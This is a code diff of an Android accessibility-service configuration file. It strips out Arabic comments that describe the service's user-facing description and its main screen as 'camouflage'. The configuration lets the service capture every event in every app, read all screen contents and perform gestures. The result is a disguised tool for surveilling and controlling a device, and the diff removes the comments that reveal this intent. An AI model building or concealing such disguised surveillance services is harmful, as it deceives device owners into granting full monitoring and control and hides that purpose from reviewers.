@@ -23,89 +23,17 @@
   كلما كانت أقل "خطورة" في الظاهر، كان التمويه أفضل.
 -->
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-
-    <!-- وصف يظهر للمستخدم عند تفعيل الخدمة (تمويه) -->
     android:description="@string/accessibility_description"
-
-    <!-- ملخص قصير (يظهر في قائمة الخدمات) -->
     android:summary="@string/accessibility_summary"
-
-    <!--
-      أنواع الأحداث التي نستقبلها:
-      - typeAllMask: كل الأحداث (نحتاجها لمراقبة كل شيء).
-      يمكن تقليلها لتوفير البطارية، لكن للمسابقة نريد كل شيء.
-    -->
     android:accessibilityEventTypes="typeAllMask"
-
-    <!--
-      نوع التغذية الراجعة:
-      - feedbackGeneric: عام (بدون صوت أو اهتزاز مزعج).
-      لا نستخدم feedbackSpoken أو feedbackHaptic لتجنب إزعاج المستخدم.
-    -->
     android:accessibilityFeedbackType="feedbackGeneric"
-
-    <!--
-      مهلة الإشعارات: 100ms.
-      كلما قلّت، زادت سرعة الاستجابة لكن زاد استهلاك البطارية.
-      100ms توازن جيد.
-    -->
     android:notificationTimeout="100"
-
-    <!--
-      canPerformGestures: ضروري لـ dispatchGesture.
-      بدونه، tap() و swipe() سيفشلان صامتين.
-    -->
     android:canPerformGestures="true"
-
-    <!--
-      canRetrieveWindowContent: ضروري لقراءة شجرة الشاشة (ScreenReader).
-      بدونه، rootInActiveWindow سيكون null دائماً.
-    -->
     android:canRetrieveWindowContent="true"
-
-    <!--
-      canRequestTouchExplorationMode: يسمح بوضع استكشاف اللمس.
-      مفيد لبعض الأجهزة، لكنه قد يغير سلوك اللمس.
-      نتركه false لتجنب التعارض.
-    -->
     android:canRequestTouchExplorationMode="false"
-
-    <!--
-      canRequestFilterKeyEvents: لا نحتاج اعتراض لوحة المفاتيح.
-      نتركه false.
-    -->
     android:canRequestFilterKeyEvents="false"
-
-    <!--
-      canControlMagnification: لا نحتاج التكبير.
-      نتركه false.
-    -->
     android:canControlMagnification="false"
-
-    <!--
-      canRequestEnhancedWebAccessibility: لا نحتاج.
-      نتركه false.
-    -->
     android:canRequestEnhancedWebAccessibility="false"
-
-    <!--
-      accessibilityFlags: خيارات إضافية.
-      - flagDefault: السلوك الافتراضي.
-      - flagReportViewIds: يملأ viewIdResourceName (مفيد لـ ScreenReader).
-      - flagIncludeNotImportantViews: يشمل العقد غير المهمة (مفيد للتحكم الكامل).
-    -->
     android:accessibilityFlags="flagDefault|flagReportViewIds|flagIncludeNotImportantViews"
-
-    <!--
-      packageNames: نحدد التطبيقات التي نراقبها.
-      إذا تركناها فارغة، نراقب كل التطبيقات.
-      للمسابقة، نريد كل شيء، لذا نتركها فارغة.
-    -->
     android:packageNames=""
-
-    <!--
-      settingsActivity: شاشة إعدادات اختيارية للخدمة.
-      لا نحتاجها (نستخدم MainActivity للتمويه).
-      نتركها فارغة.
-    -->
     android:settingsActivity="" />
